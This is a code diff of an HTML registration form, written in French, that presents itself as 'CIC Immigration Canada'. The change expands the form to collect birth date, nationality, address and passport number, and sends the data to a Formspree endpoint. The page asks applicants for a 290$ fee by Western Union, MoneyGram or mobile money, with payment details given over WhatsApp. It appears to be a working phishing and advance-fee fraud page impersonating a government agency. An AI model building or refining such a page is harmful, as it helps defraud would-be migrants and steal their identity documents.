@@ -9,7 +9,7 @@
       font-family: Arial, sans-serif;
       background: #f5f5f5;
       padding: 20px;
-      max-width: 600px;
+      max-width: 700px;
       margin: auto;
       color: #333;
     }
@@ -22,7 +22,7 @@
       margin-top: 15px;
       font-weight: bold;
     }
-    input, select {
+    input, select, textarea {
       width: 100%;
       padding: 8px;
       margin-top: 5px;
@@ -44,7 +44,6 @@
     button:hover {
       background-color: #b22222;
     }
-    /* Message de confirmation */
     #merciMessage {
       display: none;
       text-align: center;
@@ -60,27 +59,102 @@
   <h1>Formulaire d'inscription CIC Immigration Canada</h1>
 
   <form id="inscriptionForm" action="https://formspree.io/f/xwpqozag" method="POST">
-    <label for="nom">Nom complet</label>
-    <input type="text" id="nom" name="nom" required />
+    <label>Nom</label>
+    <input type="text" name="nom" required />
 
-    <label for="email">Adresse email</label>
-    <input type="email" id="email" name="email" required />
+    <label>Prénom</label>
+    <input type="text" name="prenom" required />
 
-    <label for="telephone">Numéro de téléphone</label>
-    <input type="tel" id="telephone" name="telephone" required />
+    <label>Date de naissance</label>
+    <input type="date" name="naissance" required />
 
-    <label for="paiement">Méthode de paiement</label>
-    <select id="paiement" name="paiement" required>
-      <option value="">--Choisissez une méthode--</option>
+    <label>Nationalité</label>
+    <input type="text" name="nationalite" required />
+
+    <label>Sexe</label>
+    <select name="sexe">
+      <option value="">--Sélectionnez--</option>
+      <option value="Homme">Homme</option>
+      <option value="Femme">Femme</option>
+    </select>
+
+    <label>Adresse complète</label>
+    <textarea name="adresse" rows="2" required></textarea>
+
+    <label>Numéro de téléphone</label>
+    <input type="tel" name="telephone" required />
+
+    <label>Email</label>
+    <input type="email" name="email" required />
+
+    <label>Pays actuel</label>
+    <input type="text" name="pays_actuel" required />
+
+    <label>Situation familiale</label>
+    <select name="situation">
+      <option value="">--Sélectionnez--</option>
+      <option value="Célibataire">Célibataire</option>
+      <option value="Marié(e)">Marié(e)</option>
+      <option value="Divorcé(e)">Divorcé(e)</option>
+    </select>
+
+    <label>Niveau d'études</label>
+    <select name="etudes">
+      <option value="">--Sélectionnez--</option>
+      <option value="Primaire">Primaire</option>
+      <option value="Secondaire">Secondaire</option>
+      <option value="Université">Université</option>
+    </select>
+
+    <label>Profession actuelle</label>
+    <input type="text" name="profession" />
+
+    <label>Langues parlées</label>
+    <input type="text" name="langues" />
+
+    <label>Avez-vous un passeport ?</label>
+    <select name="passeport">
+      <option value="Oui">Oui</option>
+      <option value="Non">Non</option>
+    </select>
+
+    <label>Numéro du passeport (si disponible)</label>
+    <input type="text" name="numero_passeport" />
+
+    <label>Avez-vous déjà voyagé en Europe ?</label>
+    <select name="voyage_europe">
+      <option value="Oui">Oui</option>
+      <option value="Non">Non</option>
+    </select>
+
+    <label>Avez-vous déjà fait une demande d’immigration ?</label>
+    <select name="demande_immigration">
+      <option value="Oui">Oui</option>
+      <option value="Non">Non</option>
+    </select>
+
+    <label>Êtes-vous prêt à payer les frais d'inscription (290$) ?</label>
+    <select name="paiement_pret" required>
+      <option value="Oui">Oui</option>
+      <option value="Non">Non</option>
+    </select>
+
+    <label>Méthode de paiement choisie</label>
+    <select name="paiement">
       <option value="Western Union">Western Union</option>
       <option value="MoneyGram">MoneyGram</option>
       <option value="Orange Money">Orange Money</option>
       <option value="Wave">Wave</option>
-      <option value="Mpesa">Mpesa</option>
+      <option value="Autre">Autre</option>
     </select>
 
-    <label for="recu">Numéro du reçu de paiement</label>
-    <input type="text" id="recu" name="recu" placeholder="Numéro du reçu" required />
+    <label>Numéro du reçu de paiement</label>
+    <input type="text" name="recu" />
+
+    <label>
+      <input type="checkbox" name="conditions" required />  
+      J'accepte les conditions générales
+    </label>
 
     <button type="submit">Envoyer l'inscription</button>
   </form>
@@ -88,8 +162,8 @@
   <div id="merciMessage">
     <h2>Merci, votre inscription a bien été reçue !</h2>
     <p>
-      Vous pouvez désormais procéder au paiement des frais d'inscription de 290 $ dans les plus brefs délais.<br />
-      Faites une capture d'écran de cette confirmation et envoyez-la via WhatsApp au <strong>+1 (571) 376-0820</strong> afin d'obtenir les coordonnées de paiement.<br />
+      Après votre inscription, vous devez procéder au paiement des frais d'inscription de <strong>290 $</strong>.<br />
+      Faites une capture d'écran de cette confirmation et envoyez-la via WhatsApp au <strong>+1 (571) 376-0820</strong> pour recevoir les coordonnées de paiement.<br />
       Une fois le paiement effectué, la direction commencera la préparation de vos documents.
     </p>
   </div>
@@ -99,7 +173,7 @@
     const merciMessage = document.getElementById('merciMessage');
 
     form.addEventListener('submit', function(event) {
-      event.preventDefault(); // Empêche l'envoi classique
+      event.preventDefault();
 
       const data = new FormData(form);
 
@@ -109,8 +183,8 @@
         headers: { 'Accept': 'application/json' }
       }).then(response => {
         if (response.ok) {
-          form.style.display = 'none'; // Cache le formulaire
-          merciMessage.style.display = 'block'; // Affiche le message
+          form.style.display = 'none';
+          merciMessage.style.display = 'block';
           form.reset();
         } else {
           alert("Une erreur est survenue, veuillez réessayer.");
@@ -121,4 +195,4 @@
     });
   </script>
 </body>
-</html>
+  </html>
